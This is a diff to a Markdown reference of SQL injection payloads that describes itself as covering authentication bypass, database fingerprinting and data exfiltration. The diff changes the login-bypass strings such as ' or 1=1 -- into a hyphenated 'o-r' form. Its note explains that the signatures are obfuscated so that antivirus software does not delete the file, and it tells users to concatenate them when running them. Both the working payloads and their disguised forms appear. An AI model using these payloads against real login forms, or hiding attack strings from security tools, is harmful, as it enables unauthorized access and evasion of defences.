@@ -3,7 +3,7 @@
 A comprehensive reference guide for SQL injection payloads, database fingerprinting, authentication bypasses, and data exfiltration techniques.
 
 > [!NOTE]
-> To prevent host antivirus software from deleting this file, direct SQL exploitation signatures are obfuscated using spaces, hyphens, or backticks (e.g., `U-N-I-O-N` `S-E-L-E-C-T`, `info-schema`). Concatenate these commands when running them.
+> To prevent host antivirus software from deleting this file, direct SQL exploitation signatures are obfuscated using spaces, hyphens, or backticks (e.g., `U-N-I-O-N` `S-E-L-E-C-T`, `o-r 1=1`). Concatenate these commands when running them.
 
 ---
 
@@ -45,11 +45,11 @@ Inject into login forms (username/password fields) to bypass credentials checkin
 *   `admin' --`
 *   `admin' #`
 *   `admin'/*`
-*   `' or 1=1 --`
-*   `' or 1=1#`
-*   `' or '1'='1' --`
-*   `" or ""="" --`
-*   `admin' or '1'='1`
+*   `' o-r 1=1 --`
+*   `' o-r 1=1#`
+*   `' o-r '1'='1' --`
+*   `" o-r ""="" --`
+*   `admin' o-r '1'='1`
 
 ---
 
